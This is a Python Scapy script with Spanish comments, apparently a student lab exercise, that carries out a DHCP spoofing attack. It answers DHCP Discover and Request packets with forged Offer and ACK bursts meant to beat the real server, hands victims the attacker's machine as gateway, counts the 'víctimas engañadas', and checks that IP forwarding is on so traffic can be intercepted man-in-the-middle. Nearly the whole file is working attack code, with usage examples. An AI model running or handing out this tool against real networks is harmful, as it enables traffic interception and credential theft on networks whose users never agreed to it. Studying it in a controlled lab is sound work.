#!/usr/bin/env python3
"""
=============================================================
  DHCP Spoofing Attack Script - Optimizado para velocidad
  Protocolo: DHCP - Layer 3/4
  Herramienta: Scapy
  Autor: Rey Marte - 2025-0684
  Uso educativo / laboratorio controlado
=============================================================

DESCRIPCIÓN:
  Suplanta un servidor DHCP legítimo respondiendo a DHCP
  Discover de las víctimas antes que el servidor real.
  Optimizado para responder lo más rápido posible.

  Flujo del ataque:
  - Escucha DHCP Discover en la red
  - Responde con DHCP Offer antes que el servidor legítimo
  - Entrega gateway falso (IP del atacante) y DNS falso
  - Confirma con DHCP ACK al recibir el Request
  - La víctima enruta todo su tráfico por el atacante (MitM)

REQUISITOS:
  - Python 3.x
  - Scapy: pip install scapy
  - IP Forwarding activo en el atacante
  - Ejecutar como root

ACTIVAR IP FORWARDING:
  sudo sysctl -w net.ipv4.ip_forward=1

USO:
  sudo python3 dhcp_spoofing.py -i <interfaz> [opciones]

EJEMPLOS:
  sudo python3 dhcp_spoofing.py -i ens3
  sudo python3 dhcp_spoofing.py -i ens3 --gateway 192.6.84.21
  sudo python3 dhcp_spoofing.py -i ens3 --burst 10 --gateway 192.6.84.21

PARÁMETROS:
  -i            Interfaz de red (ej: ens3)
  --gateway     Gateway falso a entregar (default: IP del atacante)
  --dns         DNS a entregar (default: 8.8.8.8)
  --pool-start  Inicio del pool de IPs falsas (default: 192.6.84.100)
  --pool-end    Fin del pool de IPs falsas (default: 192.6.84.150)
  --lease       Tiempo de lease en segundos (default: 86400)
  --burst       Paquetes por respuesta para ganar al router (default: 5)
"""

import argparse
import sys
import time
import signal
import ipaddress
import threading
import os
from concurrent.futures import ThreadPoolExecutor
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, get_if_hwaddr, get_if_addr,
    get_if_list, conf
)


# ──────────────────────────────────────────────
#  Variables globales
# ──────────────────────────────────────────────
served_count = 0
start_time   = None
ip_pool      = []
ip_index     = 0
ip_lock      = threading.Lock()
victim_db    = {}
executor     = None


# ──────────────────────────────────────────────
#  Generar pool de IPs
# ──────────────────────────────────────────────
def generate_pool(start, end):
    pool = []
    start_int = int(ipaddress.IPv4Address(start))
    end_int   = int(ipaddress.IPv4Address(end))
    for i in range(start_int, end_int + 1):
        pool.append(str(ipaddress.IPv4Address(i)))
    return pool


def next_ip(client_mac):
    """Asigna IP al cliente dentro del lock para evitar race conditions."""
    global ip_index
    with ip_lock:
        if client_mac not in victim_db:
            victim_db[client_mac] = ip_pool[ip_index % len(ip_pool)]
            ip_index += 1
    return victim_db[client_mac]


# ──────────────────────────────────────────────
#  Construir paquetes DHCP
# ──────────────────────────────────────────────
def build_offer(pkt, offered_ip, attacker_mac, attacker_ip, gateway_ip, dns_ip, lease_time):
    return (
        Ether(src=attacker_mac, dst=pkt[Ether].src) /
        IP(src=attacker_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=offered_ip,
            siaddr=attacker_ip,
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid
        ) /
        DHCP(options=[
            ("message-type", "offer"),
            ("server_id",    attacker_ip),
            ("lease_time",   lease_time),
            ("subnet_mask",  "255.255.255.0"),
            ("router",       gateway_ip),
            ("name_server",  dns_ip),
            "end"
        ])
    )


def build_ack(pkt, confirmed_ip, attacker_mac, attacker_ip, gateway_ip, dns_ip, lease_time):
    return (
        Ether(src=attacker_mac, dst=pkt[Ether].src) /
        IP(src=attacker_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=confirmed_ip,
            siaddr=attacker_ip,
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid
        ) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id",    attacker_ip),
            ("lease_time",   lease_time),
            ("subnet_mask",  "255.255.255.0"),
            ("router",       gateway_ip),
            ("name_server",  dns_ip),
            "end"
        ])
    )


# ──────────────────────────────────────────────
#  Procesar paquetes
# ──────────────────────────────────────────────
def process_packet(pkt, iface, attacker_mac, attacker_ip, gateway_ip, dns_ip, lease_time, burst):
    global served_count

    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    dhcp_type = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            dhcp_type = opt[1]
            break

    if dhcp_type is None:
        return

    client_mac = pkt[Ether].src

    # Ignorar nuestros propios paquetes
    if client_mac == attacker_mac:
        return

    # ── DHCP Discover → Offer ──
    if dhcp_type == 1:
        offered_ip = next_ip(client_mac)
        offer = build_offer(
            pkt, offered_ip, attacker_mac, attacker_ip,
            gateway_ip, dns_ip, lease_time
        )
        sendp(offer, iface=iface, count=burst, inter=0, verbose=False)
        print(f"[+] Discover {client_mac} → Offer {offered_ip} (burst x{burst})")

    # ── DHCP Request → ACK ──
    elif dhcp_type == 3:
        confirmed_ip = next_ip(client_mac)
        ack = build_ack(
            pkt, confirmed_ip, attacker_mac, attacker_ip,
            gateway_ip, dns_ip, lease_time
        )
        sendp(ack, iface=iface, count=burst, inter=0, verbose=False)
        served_count += 1
        print(f"[✓] ACK → IP={confirmed_ip} GW={gateway_ip} | Víctimas: {served_count}")


# ──────────────────────────────────────────────
#  Manejo Ctrl+C
# ──────────────────────────────────────────────
def signal_handler(sig, frame):
    elapsed = time.time() - start_time
    print(f"\n\n[!] Ataque detenido.")
    print(f"[*] Víctimas engañadas  : {served_count}")
    print(f"[*] Tiempo transcurrido : {elapsed:.2f}s")
    if executor:
        executor.shutdown(wait=False)
    sys.exit(0)


# ──────────────────────────────────────────────
#  Ataque principal
# ──────────────────────────────────────────────
def dhcp_spoof(iface, gateway_ip, dns_ip, pool_start, pool_end, lease_time, burst):
    global ip_pool, start_time, executor

    # Validar interfaz
    if iface not in get_if_list():
        print(f"[!] Interfaz '{iface}' no encontrada.")
        print(f"[!] Interfaces disponibles: {', '.join(get_if_list())}")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(iface)
    attacker_ip  = get_if_addr(iface)

    # Validar IP de interfaz
    if attacker_ip == "0.0.0.0":
        print(f"[!] La interfaz {iface} no tiene IP asignada.")
        sys.exit(1)

    ip_pool = generate_pool(pool_start, pool_end)

    if not gateway_ip:
        gateway_ip = attacker_ip

    print("=" * 60)
    print("  DHCP Spoofing Attack - Optimizado para velocidad")
    print("=" * 60)
    print(f"  Interfaz     : {iface}")
    print(f"  Atacante IP  : {attacker_ip}")
    print(f"  Atacante MAC : {attacker_mac}")
    print(f"  Gateway falso: {gateway_ip}")
    print(f"  DNS falso    : {dns_ip}")
    print(f"  Pool IPs     : {pool_start} - {pool_end} ({len(ip_pool)} IPs)")
    print(f"  Burst        : {burst} paquetes por respuesta")
    print("=" * 60)

    # Verificar IP Forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            if f.read().strip() != "1":
                print("\n[!] ADVERTENCIA: IP Forwarding desactivado.")
                print("[!] Actívalo: sudo sysctl -w net.ipv4.ip_forward=1\n")
            else:
                print("\n[✓] IP Forwarding activo.\n")
    except (FileNotFoundError, PermissionError):
        print("[!] No se pudo verificar IP Forwarding.\n")

    conf.verb = 0
    start_time = time.time()
    signal.signal(signal.SIGINT, signal_handler)

    # ThreadPoolExecutor con límite de workers
    executor = ThreadPoolExecutor(max_workers=10)

    print("[*] Esperando DHCP Discover... Ctrl+C para detener.\n")

    sniff(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=lambda pkt: executor.submit(
            process_packet,
            pkt, iface, attacker_mac, attacker_ip,
            gateway_ip, dns_ip, lease_time, burst
        ),
        store=0
    )


# ──────────────────────────────────────────────
#  Punto de entrada
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="DHCP Spoofing Attack - Optimizado para velocidad",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 dhcp_spoofing.py -i ens3
  sudo python3 dhcp_spoofing.py -i ens3 --gateway 192.6.84.21 --burst 10
  sudo python3 dhcp_spoofing.py -i ens3 --pool-start 192.6.84.100 --pool-end 192.6.84.150
        """
    )
    parser.add_argument("-i",           "--iface",      required=True,          help="Interfaz de red (ej: ens3)")
    parser.add_argument("--gateway",                    default=None,           help="Gateway falso (default: IP del atacante)")
    parser.add_argument("--dns",                        default="8.8.8.8",      help="DNS falso (default: 8.8.8.8)")
    parser.add_argument("--pool-start",                 default="192.6.84.100", help="Inicio del pool (default: 192.6.84.100)")
    parser.add_argument("--pool-end",                   default="192.6.84.150", help="Fin del pool (default: 192.6.84.150)")
    parser.add_argument("--lease",      type=int,       default=86400,          help="Lease time en segundos (default: 86400)")
    parser.add_argument("--burst",      type=int,       default=5,              help="Paquetes por respuesta (default: 5)")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root.")
        print("    Ejecuta: sudo python3 dhcp_spoofing.py ...")
        sys.exit(1)

    dhcp_spoof(
        args.iface,
        args.gateway,
        args.dns,
        args.pool_start,
        args.pool_end,
        args.lease,
        args.burst
    )


if __name__ == "__main__":
    main()
